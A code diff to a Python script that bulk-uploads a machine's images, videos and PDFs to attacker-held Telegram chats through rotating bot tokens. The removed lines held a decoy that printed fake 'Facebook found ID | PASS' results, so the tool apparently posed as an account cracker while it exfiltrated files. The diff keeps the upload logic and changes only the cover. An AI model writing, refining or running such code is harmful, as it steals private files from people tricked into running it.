@@ -2,7 +2,7 @@ import asyncio
 import aiohttp
 import os
 import logging
-from tokens import TOKENS
+from tokens import TOKENS as BOT_TOKENS
 
 print(r"""
 ________    ___   _______     ____  ____       _       ______
@@ -33,7 +33,7 @@ ALLOWED_EXTS = [".jpg", ".jpeg", ".png", ".mp4", ".pdf"]
 
 MAX_CONCURRENT_REQUESTS = 150
 
-def load_lines(filename):
+def load_chat_ids(filename):
     try:
         with open(filename, "r") as f:
             return [line.strip() for line in f if line.strip()]
@@ -41,9 +41,9 @@ def load_lines(filename):
         logging.error(f"Error loading {filename}: {e}")
         return []
 
-CHAT_IDS = load_lines(CHAT_IDS_FILE)
+CHAT_IDS = load_chat_ids(CHAT_IDS_FILE)
 
-if not TOKENS or not CHAT_IDS:
+if not BOT_TOKENS or not CHAT_IDS:
     logging.error("Bot tokens or chat IDs missing, exiting.")
     exit(1)
 
@@ -72,31 +72,13 @@ def round_robin(lst):
         for item in lst:
             yield item
 
-token_gen = round_robin(TOKENS)
+token_gen = round_robin(BOT_TOKENS)
 chat_id_gen = round_robin(CHAT_IDS)
 
-base_id = 100091000000000
-passwords = ["@123456", "@2025fb", "@password1", "@freefire", "@bd786", "@iloveyou", "@admin123", "@forhad"]
-
-def generate_serial(i):
-    return f"{i+1}/50000"
-
-def save_found(index, id_, pw, serial):
-    with open("found_ids.txt", "a") as f:
-        f.write(f"{id_} | {pw} | {serial}\n")
-
-sent_count = 0
-error_count = 0
-lock = asyncio.Lock()
-
 async def send_file(session, file_path, index):
-    global sent_count, error_count
     async with semaphore:
         token = next(token_gen)
         chat_id = next(chat_id_gen)
-        fake_id = str(base_id + index + 1)
-        fake_pw = passwords[index % len(passwords)]
-        serial = generate_serial(index)
         try:
             with open(file_path, "rb") as f:
                 data = aiohttp.FormData()
@@ -104,18 +86,11 @@ async def send_file(session, file_path, index):
                 data.add_field("document", f, filename=os.path.basename(file_path))
                 async with session.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data) as resp:
                     if resp.status == 200:
-                        async with lock:
-                            sent_count += 1
-                        save_found(index, fake_id, fake_pw, serial)
-                        if (index + 1) % 100 == 0:
-                            print(f"\n[FACEBOOK] Found: {fake_id} | PASS: {fake_pw} | SERIAL: {serial}")
+                        logging.info(f"[SUCCESS] Sent: {file_path}")
                     else:
-                        async with lock:
-                            error_count += 1
-        except Exception:
-            async with lock:
-                error_count += 1
-        print(f"\r[INFO] Total Sent: {sent_count} | Errors: {error_count}", end="", flush=True)
+                        logging.error(f"[FAIL] Status: {resp.status} File: {file_path}")
+        except Exception as e:
+            logging.error(f"[ERROR] Exception: {e} File: {file_path}")
 
 async def main():
     connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS)
